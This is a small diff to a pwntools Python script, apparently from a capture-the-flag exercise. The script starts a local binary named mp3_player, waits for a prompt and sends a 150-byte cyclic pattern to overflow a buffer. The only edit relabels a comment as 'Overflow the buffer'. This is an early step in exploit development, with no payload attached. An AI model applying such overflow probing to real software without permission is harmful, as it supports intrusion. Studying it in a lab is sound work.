@@ -3,7 +3,7 @@ from pwn import *
 elf = ELF("./mp3_player", checksec=False)
 p = elf.process()
 
-# Wait for input prompt
+# Overflow the buffer
 p.recvuntil(b"ABBA")
 p.sendline(cyclic(150))
 p.wait()
